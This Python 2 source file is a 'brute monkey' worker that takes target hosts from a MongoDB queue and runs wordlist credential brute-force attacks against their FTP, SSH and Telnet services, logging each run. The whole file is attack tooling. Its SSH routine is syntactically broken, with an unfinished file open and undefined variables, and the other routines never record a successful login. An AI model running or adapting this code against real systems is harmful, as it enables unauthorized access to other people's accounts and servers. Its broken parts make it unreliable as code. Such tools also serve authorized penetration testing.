#!/usr/bin/python

import paramiko
import ftplib
import telnetlib
import socket
import time
from pymongo import MongoClient
from random import randint

def findLoginBoxes(runTime,dbIp,dbName,monkeyIq,monkeyLoc,monkeyId):
    timeout = time.time() + 60 * runTime

    while True:
        targets = []
        ports = []
        targetTried = False
        time.sleep(1)

        if time.time() > timeout:
            break

        conn = MongoClient(dbIp,27017)
        db = conn[dbName]
        hosts = db.hosts


        if hosts.find({'location':monkeyLoc}).count() == 0:
            print 'Brute monkey is waiting for work.  Eating bananas.  Will check again in 10 seconds.'
            time.sleep(10)

        else:
            #We have to set an extra boolean so a match will skip the other possible matches
            # (i.e. don't repeat attacking the same host if other services are running on same host)
            for work in hosts.find({'location':monkeyLoc}):
                if 21 in work['ports'] and targetTried == False:
                    targets.append(work['ip'])
                    ports.append(21)
                    targetTried = True

                if 22 in work['ports'] and targetTried == False:
                    targets.append(work['ip'])
                    ports.append(22)
                    targetTried = True

                if 23 in work['ports'] and targetTried == False:
                    targets.append(work['ip'])
                    ports.append(23)
                    targetTried = True


        if len(targets) == 0:
            print 'Brute monkey is waiting for something to brute force.  Eating bananas.  Will check again in 10 seconds.'
            time.sleep(10)

        else:
            print 'Brute monkey got work! Starting credential brute forcing!'

            index = randint(0,len(targets)-1)

            if ports[index] == 21:
                ftpBrute(targets[index],db,hosts,monkeyId)

            elif ports[index] == 22:
                sshBrute(targets[index],db,hosts,monkeyId)

            elif ports[index] == 23:
                telBrute(targets[index],db,hosts,monkeyId)

def sshBrute(victim,db,coll,monkeyId):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        with open './lists/'
    try:
        ssh.connect(target, 22, usr, pwd)

    except paramiko.AuthenticationException:
        pass

    except socket.error:
        pass

def ftpBrute(victim,db,coll,monkeyId):
    startTime = time.ctime()

    try:
        with open('./lists/wordlist_ftp.txt') as f:
            credList = f.readlines()

    except:
        print 'Error opening FTP cred list.'
        return


    for creds in credList:
        user, pwd = creds.rstrip().split(':')

        try:
            ftp = ftplib.FTP(victim)
            ftp.login(user, pwd)

        except:
            pass

    endTime = time.ctime()
    print 'finished FTP brute forcing of ' + victim + 'at' + endTime
    saveResults('ftpbruteforce',db,coll,victim,21,startTime,endTime,monkeyId)

def telBrute (victim,db,coll,monkeyId):
    startTime = time.ctime()

    try:
        with open('./lists/wordlist_telnet.txt') as f:
            credList = f.readlines()

    except:
        print 'Error opening telnet cred list.'
        return

    for creds in credList:
        user, pwd = creds.rstrip().split(':')

        try:
            telnet = telnetlib.Telnet(victim)
            telnet.read_until('username:')
            telnet.write(user + '\n')
            telnet.read_until('password:')
            telnet.write(pwd + '\n')

        except:
            pass

    endTime = time.ctime()
    print 'finished telnet brute forcing of ' + victim + 'at' + endTime
    saveResults('telnetbruteforce',db,coll,victim,23,startTime,endTime,monkeyId)

def saveResults(whichBrute,dbConn,coll,target,port,startTime,endTime,monkeyId):
    action = dbConn.actions
    action.insert({'action': whichBrute,'ip':target,'port':port,'start':startTime,'end':endTime,'id':monkeyId})
    return
